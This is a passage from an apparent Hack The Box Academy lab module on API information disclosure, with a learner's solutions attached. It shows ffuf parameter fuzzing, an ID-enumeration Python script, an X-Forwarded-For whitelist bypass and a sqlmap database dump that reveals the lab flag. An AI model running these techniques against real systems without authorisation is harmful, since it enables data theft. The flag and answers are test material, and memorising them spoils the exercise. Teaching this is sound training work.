# Information Disclosure (with a twist of SQLi)

As already discussed, security-related inefficiencies or misconfigurations in a web service or API can result in information disclosure.

When assessing a web service or API for information disclosure, we should spend considerable time on fuzzing.

***

### Information Disclosure through Fuzzing

Proceed to the end of this section and click on `Click here to spawn the target system!` or the `Reset Target` icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target API and follow along.

Suppose we are assessing an API residing in `http://<TARGET IP>:3003`.

Maybe there is a parameter that will reveal the API's functionality. Let us perform parameter fuzzing using _ffuf_ and the [burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt) list, as follows.

We notice a similar response size in every request. This is because supplying any parameter will return the same text, not an error like 404.

Let us filter out any responses having a size of 19, as follows.

It looks like _id_ is a valid parameter. Let us check the response when specifying _id_ as a parameter and a test value.

Information Disclosure (with a twist of SQLi)

```shell-session
AIceBear@htb[/htb]$ curl http://<TARGET IP>:3003/?id=1
[{"id":"1","username":"admin","position":"1"}]
```

Find below a Python script that could automate retrieving all information that the API returns (save it as `brute_api.py`).

Code: python

```python
import requests, sys

def brute():
    try:
        value = range(10000)
        for val in value:
            url = sys.argv[1]
            r = requests.get(url + '/?id='+str(val))
            if "position" in r.text:
                print("Number found!", val)
                print(r.text)
    except IndexError:
        print("Enter a URL E.g.: http://<TARGET IP>:3003/")

brute()
```

* We import two modules _requests_ and _sys_. _requests_ allows us to make HTTP requests (GET, POST, etc.), and _sys_ allows us to parse system arguments.
* We define a function called _brute_, and then we define a variable called _value_ which has a range of _10000_. _try_ and _except_ help in exception handling.
* _url = sys.argv\[1]_ receives the first argument.
* _r = requests.get(url + '/?id='+str(val))_ creates a response object called _r_ which will allow us to get the response of our GET request. We are just appending _/?id=_ to our request and then _val_ follows, which will have a value in the specified range.
* _if "position" in r.text:_ looks for the _position_ string in the response. If we enter a valid ID, it will return the position and other information. If we don't, it will return _\[]_.

The above script can be run, as follows.

Information Disclosure (with a twist of SQLi)

```shell-session
AIceBear@htb[/htb]$ python3 brute_api.py http://<TARGET IP>:3003
Number found! 1
[{"id":"1","username":"admin","position":"1"}]
Number found! 2
[{"id":"2","username":"HTB-User-John","position":"2"}]
...
```

Now you can proceed to the end of this section and answer the first question!

**TIP**: If there is a rate limit in place, you can always try to bypass it through headers such as X-Forwarded-For, X-Forwarded-IP, etc., or use proxies. These headers have to be compared with an IP most of the time. See an example below.

Code: php

```php
<?php
$whitelist = array("127.0.0.1", "1.3.3.7");
if(!(in_array($_SERVER['HTTP_X_FORWARDED_FOR'], $whitelist)))
{
    header("HTTP/1.1 401 Unauthorized");
}
else
{
  print("Hello Developer team! As you know, we are working on building a way for users to see website pages in real pages but behind our own Proxies!");
}
```

The issue here is that the code compares the _HTTP\_X\_FORWARDED\_FOR_ header to the possible _whitelist_ values, and if the _HTTP\_X\_FORWARDED\_FOR_ is not set or is set without one of the IPs from the array, it'll give a 401. A possible bypass could be setting the _X-Forwarded-For_ header and the value to one of the IPs from the array.

### Information Disclosure through SQL Injection

SQL injection vulnerabilities can affect APIs as well. That _id_ parameter looks interesting. Try submitting classic SQLi payloads and answer the second question.

**Questions**

What is the username of the third user (id=3)?

```bash
ffuf -w "/usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://10.129.202.133:3003/?FUZZ=test_value' -fs 19
#id  [Status: 200, Size: 38, Words: 7, Lines: 1, Duration: 267ms]
curl http://10.129.202.133:3003/?id=3
[{"id":"3","username":"WebServices","position":"3"}]
```

Identify the username of the user that has a position of 736373 through SQLi. Submit it as your answer.

```bash
http://10.129.202.133:3003/?id=1
#capture the get request with burpsuite
vim req.txt #save the request into a text file
sqlmap -r req.txt --batch --dump
+---------+--------------------------------+------------+
| id      | username                       | position   |
+---------+--------------------------------+------------+
| 1       | admin                          | 1          |
| 2       | HTB-User-John                  | 2          |
| 3       | WebServices                    | 3          |
| 8374932 | HTB{THE_FL4G_FOR_SQLI_IS_H3RE} | 736373     |
+---------+--------------------------------+------------+
```
